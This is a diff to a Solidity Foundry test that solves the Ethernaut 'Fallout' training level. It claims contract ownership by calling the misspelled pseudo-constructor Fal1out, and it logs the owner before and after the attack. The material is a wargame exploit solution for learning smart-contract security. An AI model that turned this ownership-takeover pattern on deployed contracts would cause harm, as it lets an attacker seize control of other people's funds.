@@ -1,58 +1,56 @@
 pragma solidity ^0.8.10;
 
 import "ds-test/test.sol";
-import "../Fallout/Fallout.sol";
 import "../Fallout/FalloutFactory.sol";
 import "../Ethernaut.sol";
 
 interface CheatCodes {
-  // Sets all subsequent calls' msg.sender to be the input address until `stopPrank` is called 
+  // Sets all subsequent calls' msg.sender to be the input address until `stopPrank` is called  
   function startPrank(address) external;
   // Resets subsequent calls' msg.sender to be `address(this)`
   function stopPrank() external;
+  // Sets an address' balance
+  function deal(address who, uint256 newBalance) external;
 }
 
 contract FalloutTest is DSTest {
     CheatCodes cheats = CheatCodes(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
     Ethernaut ethernaut;
-    FalloutFactory falloutFactory;
-    address levelAddress;
-    bool levelSuccessfullyPassed;
+    address eoaAddress = address(100);
 
     function setUp() public {
-        // Setup instances of the Ethernaut & FalloutFactory contracts
+        // Setup instance of the Ethernaut contracts
         ethernaut = new Ethernaut();
-        falloutFactory = new FalloutFactory();
+        // Deal EOA address some ether
+        cheats.deal(eoaAddress, 5 ether);
     }
 
     function testFalloutHack() public {
+        /////////////////
+        // LEVEL SETUP //
+        /////////////////
 
-        // Register the Ethernaut fallout level (this would have already been done on Rinkeby)
+        FalloutFactory falloutFactory = new FalloutFactory();
         ethernaut.registerLevel(falloutFactory);
-
-        // Add some ETH to the 0 address which we will be using 
-        payable(address(0)).transfer(1 ether);
-        // Use the startPrank cheat which enables us to excute subsequent call as another address (https://onbjerg.github.io/foundry-book/reference/cheatcodes.html)
-        cheats.startPrank(address(0));
-
-
-        // Set up the Level
-        levelAddress = ethernaut.createLevelInstance(falloutFactory);
-
-        // Cast the level address to the Fallout contract class
+        cheats.startPrank(eoaAddress);
+        address levelAddress = ethernaut.createLevelInstance(falloutFactory);
         Fallout ethernautFallout = Fallout(payable(levelAddress));
 
-        // Call Fal1out constructor function with some value, mispelling enables us to call it  
+        //////////////////
+        // LEVEL ATTACK //
+        //////////////////
+
+        // Call Fal1out constructor function with some value, mispelling enables us to call it - log owner before and after  
+        emit log_named_address("Fallout Owner Before Attack", ethernautFallout.owner());
         ethernautFallout.Fal1out{value: 1 wei}();
+        emit log_named_address("Fallout Owner After Attack", ethernautFallout.owner());
 
-        // Submit level to the core Ethernaut contract
-        levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
+        //////////////////////
+        // LEVEL SUBMISSION //
+        //////////////////////
 
-
-        // Stop the prank - calls with no longer come from address(0) 
+        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
         cheats.stopPrank();
-
-        // Verify the level has passed
         assert(levelSuccessfullyPassed);
     }
 }
